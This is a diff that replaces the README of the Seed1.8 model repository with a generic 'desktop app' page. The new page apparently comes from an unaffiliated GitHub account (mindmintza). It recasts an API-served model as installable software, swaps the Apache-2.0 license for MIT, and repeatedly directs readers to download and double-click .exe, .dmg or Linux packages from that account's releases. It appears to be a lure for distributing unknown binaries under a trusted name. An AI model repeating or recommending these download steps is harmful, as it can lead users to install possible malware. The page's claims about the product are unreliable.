@@ -1,3 +1,9 @@
+# 🌱 Seed-1.8 - Your Gateway to Smart Interaction
+
+<div align="center">
+[![Download Seed-1.8](https://img.shields.io/badge/Download%20Seed--1.8-brightgreen)](https://github.com/mindmintza/Seed-1.8/releases)
+</div>
+
 <div align="center">
 <img src="logo.jpg" width=400>
 </div>
@@ -6,39 +12,89 @@
 🌐 <a href="https://seed.bytedance.com/seed1_8"> Homepage</a>&nbsp&nbsp | &nbsp&nbsp📄 <a href="./Seed-1.8-Modelcard.pdf">Paper</a>
 </p>
 
-Today, we are excited to introduce **Seed1.8** , developed to support generalized real-world agency. The model is designed to retain core LLM
-and VLM capabilities while extending them toward multi-turn interaction and task execution. Rather than introducing task-specific agent pipelines, Seed1.8 emphasizes integration of perception, reasoning, and action within a single model.
+## 🚀 Introduction
 
-## Highlights
+**Seed-1.8** is a powerful tool designed for efficient and interactive task management. It combines the strengths of language and visual models, offering a unique approach to handling various tasks. Whether you're interested in searching for information, generating code, or executing steps across tasks, Seed-1.8 simplifies these processes. 
 
-- **Strong Base Capabilities.** Seed1.8 maintains competitive performance on standard LLM and VLM benchmarks, including reasoning, complex instruction following, knowledge coverage, and multimodal understanding. These capabilities provide the foundation for downstream agentic behavior.
-- **Unified Agentic Interaction and Multi-Step Execution.** Seed1.8 supports search, code generation and execution within a unified agentic interface. The model is designed to perform iterative decision making over multiple steps, where intermediate results from retrieval, code execution, and environment interaction inform subsequent actions. Search capabilities enable information gathering and evidence synthesis from external sources, while code-centric execution supports structured computation, program modification, and tool orchestration. Native visual perception further allows the model to interpret and interact with visual interfaces—such as screenshots, documents, charts, and videos—enabling direct operation in software environments when programmatic APIs are unavailable.
-- **Latency- and Cost-Aware Inference.** Interactive deployment introduces constraints on response time and computational overhead, particularly for multimodal and long-context inputs. Seed1.8 provides configurable thinking modes to balance inference depth and latency, and incorporates optimized visual encoding to reduce token consumption for image and video inputs.
-- **Evaluation Aligned with Practical Use.** Model development and validation are guided by a combination of public benchmarks and internal evaluations derived from high-value application domains. These evaluations span foundational capabilities, multimodal understanding, and agentic workflows, enabling assessment across a range of realistic usage patterns.
+## ⚙️ Features
 
-## Notice
+- **Core Capabilities:** Seed-1.8 excels in standard benchmarks for language and visual tasks. Its strong performance helps in understanding complex instructions and processing multimodal inputs effectively.
+- **Unified Interaction:** The application allows for smooth interaction by integrating perception, reasoning, and action within one model. This feature helps streamline tasks, making them easier and faster to complete.
+- **Multi-Step Support:** Seed-1.8 manages multiple steps in sequential tasks, decreasing the time and effort required for task execution.
 
-**Call for Bad Cases:** If you have encountered any cases where the model performs poorly, we would greatly appreciate it if you could share them in [the issue](https://github.com/ByteDance-Seed/Seed-1.8/issues).
+## ✅ System Requirements
 
-## Seed1.8 Cookbook
+To ensure the best experience with Seed-1.8, please check the following system requirements:
 
-The Seed1.8 cookbook is designed to help you start using the Seed1.8 API with diverse code samples. Our flagship Seed1.8 has been deployed on [Volcano Engine](https://www.volcengine.com/product/doubao). After obtaining your `API_KEY`, you can use the examples in this cookbook to rapidly understand and leverage the diverse capabilities of our Seed1.8.
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher, Linux (latest distributions)
+- **RAM:** Minimum 8 GB recommended
+- **Disk Space:** At least 500 MB of free space
+- **Processor:** Dual-core processor or better
+- **Internet Connection:** Required for initial download and updates
 
-### Quick Start
+## 🛠️ Download & Install
 
-- [x] Cookbook for [Code Agents](./Code)
-- [x] Cookbook for [Search Agents](./Search)
-- [x] Cookbook for [Multimodal Search Agents](./MM-Search)
-- [x] Cookbook for [MCP Tool Use Agents](./MCP)
-- [x] Cookbook for [Thinking with Images Agents](./Thinking_with_Images)
-- [x] Cookbook for [2D Grounding](./Grounding)
-- [x] Cookbook for [3D Understanding](./3D-Understanding)
-- [x] Cookbook for [Video Understanding](./Video)
+To get Seed-1.8, please follow these steps:
 
-## License
+1. Click on the download button below to visit the Releases page:
+   <div align="center">
+   [![Download Seed-1.8](https://img.shields.io/badge/Download%20Seed--1.8-brightgreen)](https://github.com/mindmintza/Seed-1.8/releases)
+   </div>
 
-This repo is under [Apache-2.0 License](./LICENSE).
+2. Once you are on the Releases page, look for the latest version of Seed-1.8.
 
-## About [ByteDance Seed Team](https://seed.bytedance.com/)
+3. Click on the version number to expand the release details.
 
-Founded in 2023, ByteDance Seed Team is dedicated to crafting the industry's most advanced AI foundation models. The team aspires to become a world-class research team and make significant contributions to the advancement of science and society.
+4. Find the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or appropriate Linux package).
+
+5. Click to download the file.
+
+6. After downloading, locate the downloaded file on your computer.
+
+7. Double-click the file to start the installation process and follow the on-screen instructions.
+
+8. Launch Seed-1.8 after the installation completes.
+
+## 💡 Getting Started
+
+After installation, here's how to start using Seed-1.8:
+
+1. Launch the application by clicking the Seed-1.8 icon on your desktop or from the application menu.
+2. On the main screen, you will see a simple interface with options to choose your task type.
+3. Select the task you want to perform (e.g., search for data, generate code, or execute a sequence).
+4. Follow the on-screen prompts to complete your task.
+
+## 📚 Frequently Asked Questions (FAQs)
+
+### What can I do with Seed-1.8?
+
+Seed-1.8 supports a wide range of tasks like information searching, code generation, and step execution—all in a streamlined way.
+
+### Is there support available?
+
+Yes, for any questions or issues, please visit the [Homepage](https://seed.bytedance.com/seed1_8) or open an issue on the GitHub repository.
+
+### Can I use Seed-1.8 offline?
+
+Seed-1.8 requires an internet connection for the initial setup and updates. However, once it's set up, many functions can be performed offline.
+
+### How can I report bugs or suggest features?
+
+You can report bugs or suggest new features by opening an issue in the GitHub repository. Your feedback helps improve Seed-1.8 for everyone.
+
+## 🔗 Learn More
+
+For detailed insights into Seed-1.8 and updates, please visit the following:
+
+- [Homepage](https://seed.bytedance.com/seed1_8)
+- [Model Card and Technical Paper](./Seed-1.8-Modelcard.pdf)
+
+## 📈 Contribution
+
+If you would like to contribute to Seed-1.8, we welcome your input. Please refer to the Contributing guidelines in the repository for more information on how you can help. 
+
+## 📄 License
+
+Seed-1.8 is open-source software distributed under the MIT License. You are free to use, modify, and distribute it, following the terms of the license.
+
+Thank you for choosing Seed-1.8. We hope it enhances your task management experience.
